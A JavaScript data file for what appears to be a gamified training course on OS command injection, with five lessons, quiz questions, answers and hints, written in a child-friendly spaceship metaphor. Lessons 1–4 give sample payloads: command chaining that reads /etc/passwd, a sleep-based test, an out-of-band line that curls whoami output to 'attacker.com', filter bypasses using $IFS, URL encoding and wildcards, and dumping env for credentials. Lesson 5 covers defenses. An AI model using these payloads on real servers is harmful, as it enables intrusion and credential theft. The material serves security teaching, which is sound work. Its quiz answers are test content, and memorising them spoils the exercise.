const LESSONS = [
  {
    title: "1. The Boss Computer (Command Injection)",
    points: 10,
    html: `<div class="htb-diagram-container"><img src="../../../assets/cmd_basics_diagram.png" alt="Command Injection Basics"></div>
      <h3>What is Command Injection?</h3>
      <p>Command Injection (or OS Command Injection) is a critical web security vulnerability that allows an attacker to execute arbitrary operating system commands on the server running an application. It occurs when user-supplied input is directly incorporated into a system shell command without proper sanitization. Because the application blindly passes the input to the OS, the attacker can hijack the host system, reading files or opening reverse shells.</p>
      <p>Imagine your computer is a giant spaceship, and deep inside the control room is the captain's chair. Whoever sits in that chair can give orders to the entire ship. Normally, only the owner is allowed to sit in that chair. But sometimes, a website asks you a simple question, like "What is your IP address so I can ping it?" The website takes your answer, runs down to the control room, and hands your answer to the captain to execute. "Command Injection" is an attack where a hacker writes a sneaky, secret order right next to their IP address. When the website hands the note to the captain, the captain accidentally executes the hacker's secret order too!</p>
      <h3>The Hacker's Punctuation Marks</h3>
      <div class="step-block">
        <div class="step-num">Tactic 1</div>
        <div class="step-body"><strong>The Semicolon (;)</strong><br>The semicolon unconditionally runs the next command. If a hacker types <code>8.8.8.8; whoami</code>, the server pings the IP, finishes, and then executes <code>whoami</code>.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Tactic 2</div>
        <div class="step-body"><strong>The AND Operator (&&)</strong><br>The double ampersand only runs the second command if the first succeeds without errors. Example: <code>8.8.8.8 && cat /etc/passwd</code>.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Tactic 3</div>
        <div class="step-body"><strong>The Pipe (|)</strong><br>A single pipe takes the output of the first command and feeds it into the second command. Hackers use these tiny symbols to chain massive attacks.</div>
      </div>`,
    questions: [
      { q: "What is the attack called where hackers sneak secret orders to the computer's captain?", a: "Command Injection", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What is the name of the 'control room' where the captain sits?", a: "Operating System Shell", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What tiny punctuation mark (;) means 'Stop what you are doing, take a breath, and do this next thing'?", a: ";", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What symbols (&&) mean 'Only run my secret order if the first one works'?", a: "&&", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What command did the hacker use to ask the captain for the name of the secret user?", a: "whoami", hint: "Check the command reference blocks." }
    ]
  },
  {
    title: "2. Hacking in the Dark (Blind Injection)",
    points: 10,
    html: `<div class="htb-diagram-container"><img src="../../../assets/cmd_blind_diagram.png" alt="Blind Command Injection"></div>
      <h3>Blind Command Injection</h3>
      <p>Blind Command Injection occurs when an application is vulnerable to OS command injection, but its HTTP responses do not contain the output of the executed commands. To verify the vulnerability and extract data, an attacker must use out-of-band (OOB) techniques or time-based payloads (forcing the server to pause execution) to infer success.</p>
      <p>Imagine you slide a secret note under the door to the captain's control room, ordering them to read the ship's secret diary. The captain reads the diary, but there is no window in the door, and the captain doesn't slide the paper back out to you. You know the captain obeyed your order, but you can't see the answer! Even if you trick the captain into running a command, the website refuses to print the answer on your screen. You are completely in the dark. But hackers have invented clever ways to steal the answers without seeing them.</p>
      <h3>Blind Extraction Methods</h3>
      <div class="step-block">
        <div class="step-num">Method 1</div>
        <div class="step-body"><strong>Time-Based Detection</strong><br>The hacker injects <code>; sleep 5</code>. If the website spins and loads for exactly 5 extra seconds, they know the command executed successfully!</div>
      </div>
      <div class="step-block">
        <div class="step-num">Method 2</div>
        <div class="step-body"><strong>Out-of-Band (OOB) Exfiltration</strong><br>If the hacker can't see the treasure, they tell the captain to mail it to them! The hacker injects <code>; curl http://attacker.com/$(whoami)</code>. The server executes the command and sends the result to the attacker's server.</div>
      </div>`,
    questions: [
      { q: "What is the attack called when the captain obeys your order, but you cannot see the answer on your screen?", a: "Blind Command Injection", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What word does a hacker type to make the Linux captain go to sleep for 5 seconds?", a: "sleep 5", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "If the website takes 5 extra seconds to load, what does it prove to the hacker?", a: "That the captain obeyed the order (the door is unlocked)", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What is the trick called where the captain mails the treasure directly to the hacker's server?", a: "Out-of-Band Exfiltration", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What tool might the captain use to mail the digital envelope across the internet?", a: "curl (or nslookup)", hint: "Look for the specific tools mentioned in the lesson." }
    ]
  },
  {
    title: "3. Disguises and Sneaky Tricks",
    points: 10,
    html: `<div class="htb-diagram-container"><img src="../../../assets/cmd_bypass_diagram.png" alt="Filter Bypasses"></div>
      <h3>WAF Evasion & Filter Bypass</h3>
      <p>Web Application Firewalls (WAFs) and custom filters often block known command injection characters (like spaces, semicolons, and pipes). To bypass these filters, attackers use shell expansion features, environment variables, and encoding to execute commands without using the blocked characters directly.</p>
      <p>Because Command Injection is so dangerous, programmers hire digital security guards to check every single note. If the guard sees a semicolon (;), they rip the note up! But hackers are masters of disguise. If the guard blocks the semicolon, the hacker uses a secret URL code like <code>%3b</code>. The guard gets confused and lets it pass. When the note reaches the control room, the captain instantly recognizes it as a semicolon! Sometimes the guards even ban the space bar! To get around this, hackers use a magical variable called <code>$IFS</code>, which is a super fancy computer word for "an invisible space."</p>
      <h3>Bypass Techniques</h3>
      <div class="step-block">
        <div class="step-num">Tactic 1</div>
        <div class="step-body"><strong>Whitespace Evasion ($IFS)</strong><br>If spaces are blocked, the Internal Field Separator (<code>$IFS</code>) variable can substitute them: <code>cat$IFS/etc/passwd</code>.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Tactic 2</div>
        <div class="step-body"><strong>URL Encoding</strong><br>Encode semicolons to <code>%3b</code> or pipes to <code>%7c</code> to sneak past filters that inspect raw characters.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Tactic 3</div>
        <div class="step-body"><strong>Wildcards (?)</strong><br>If specific words like "passwd" are blocked, wildcards can substitute letters. <code>/etc/p?sswd</code> bypasses the filter, but the shell automatically expands it to match the file!</div>
      </div>`,
    questions: [
      { q: "What secret URL code do hackers type to disguise a semicolon from the guards?", a: "%3b", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What magical bash variable acts like an invisible space bar to bypass space filters?", a: "$IFS", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What is the 'blank Scrabble tile' trick called where a symbol replaces a letter?", a: "a Wildcard", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What punctuation mark is used as a wildcard to represent any single letter?", a: "?", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "If the hacker types '/etc/p?sswd', what file does the captain actually open?", a: "passwd (or /etc/passwd)", hint: "Re-read the lesson paragraphs and step-blocks carefully." }
    ]
  },
  {
    title: "4. Taking Over the Spaceship",
    points: 10,
    html: `<div class="htb-diagram-container"><img src="../../../assets/cmd_post_exploit_diagram_v2.png" alt="Post-Exploitation"></div>
      <h3>Post-Exploitation & Automation</h3>
      <p>Once initial execution is achieved, an attacker transitions to "post-exploitation," aiming to escalate privileges, map the internal network, and establish a persistent reverse shell. Security researchers and attackers alike use automated tools like Commix to fuzz inputs, identify injection vectors, and automate the extraction process.</p>
      <p>Once a hacker successfully tricks the captain and gets an open line into the control room, they start looking around. The very first thing they ask is, "Who am I?" (<code>whoami</code>). They want to know if they are a low-level crew member or the supreme commander (root). If they are a low-level member, they type <code>ls -la /</code>, which tells the captain to print a map of every folder. Professional hackers use an amazing automatic robot tool called "Commix." You just point Commix at a website, and the robot automatically tries thousands of different tricks until it gives the hacker a beautiful, black terminal screen.</p>
      <h3>Post-Exploitation Actions</h3>
      <div class="step-block">
        <div class="step-num">Action 1</div>
        <div class="step-body"><strong>Environment Variables</strong><br>Running the <code>env</code> command dumps all environment variables. These often contain hardcoded API keys, database passwords, and cloud credentials.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Action 2</div>
        <div class="step-body"><strong>Automated Exploitation (Commix)</strong><br>Commix (Command Injection Exploiter) automates the discovery and exploitation process, easily bypassing WAFs and setting up automated reverse shells.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Action 3</div>
        <div class="step-body"><strong>Historic Disasters</strong><br>In 2014, the "Shellshock" bug allowed hackers to run commands via HTTP headers. In 2021, "Log4Shell" allowed command execution via simple chat messages in games.</div>
      </div>`,
    questions: [
      { q: "What command prints a map of every single folder and file on the spaceship?", a: "ls -la /", hint: "Check the command reference blocks." },
      { q: "What command reads the 'sticky notes' on the wall that might contain master passwords?", a: "env", hint: "Check the command reference blocks." },
      { q: "What is the name of the automatic robot tool built specifically to exploit Command Injection?", a: "Commix", hint: "Check the command reference blocks." },
      { q: "What terrifying 2014 bug let hackers take over servers just by changing their 'User-Agent' note?", a: "Shellshock", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What 2021 bug let hackers take over servers just by typing a code into a Minecraft chat box?", a: "Log4Shell", hint: "Re-read the lesson paragraphs and step-blocks carefully." }
    ]
  },
  {
    title: "5. Putting the Captain in a Bubble",
    points: 10,
    html: `<div class="htb-diagram-container"><img src="../../../assets/cmd_defense_diagram_v2.png" alt="Command Injection Defense"></div>
      <h3>Defending Against Command Injection</h3>
      <p>The primary defense against OS command injection is to avoid calling out to OS commands entirely by using built-in, secure programming language libraries. If a system call is strictly necessary, developers must implement strict input validation (allowlisting) and use robust input escaping functions specifically designed to neutralize shell metacharacters.</p>
      <p>If Command Injection is so terrifying, how do we stop it? The absolute best defense in the entire world is very simple: Never, ever let strangers talk to the captain! If a website needs to ping an IP address, it shouldn't ask the captain to open a command line. Instead, it should use a safe, built-in library function. A library function is like a tiny, specialized robot that only knows how to do one exact thing. If a hacker hands the tiny robot a tricky semicolon, the tiny robot just stares at it blankly because it doesn't understand semicolons. The tiny robot cannot be tricked!</p>
      <h3>Defense Strategies</h3>
      <div class="step-block">
        <div class="step-num">Defense 1</div>
        <div class="step-body"><strong>Use Built-in APIs</strong><br>Avoid <code>system()</code> or <code>exec()</code>. Instead of running a shell <code>ping</code> command, use an HTTP networking library native to Python, Node.js, or Java.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Defense 2</div>
        <div class="step-body"><strong>Strict Allowlisting (Whitelisting)</strong><br>If a command must take an IP address, validate that the input contains ONLY numbers and periods. Reject any input containing letters, spaces, or symbols immediately.</div>
      </div>
      <div class="step-block">
        <div class="step-num">Defense 3</div>
        <div class="step-body"><strong>Input Escaping</strong><br>As a last resort, use specific escaping functions (like <code>escapeshellarg()</code> in PHP or <code>shlex.quote()</code> in Python) to wrap user input in single quotes and neutralize any dangerous metacharacters.</div>
      </div>`,
    questions: [
      { q: "What is the absolute best way to prevent Command Injection?", a: "Never let user input talk to the Operating System Shell (use library functions instead)", hint: "Check the command reference blocks." },
      { q: "What is the name of the incredibly strict bouncer that only allows safe characters (like numbers) through?", a: "a Whitelist", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "Do Blacklists (trying to block all bad words) work against hackers? (yes/no)", a: "no", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What is the last-resort defense where you wrap the user's input in protective digital bubble wrap?", a: "Escaping", hint: "Re-read the lesson paragraphs and step-blocks carefully." },
      { q: "What PHP tool is used to bubble-wrap the hacker's note before handing it to the captain?", a: "escapeshellarg()", hint: "Look for the specific tools mentioned in the lesson." }
    ]
  }
];
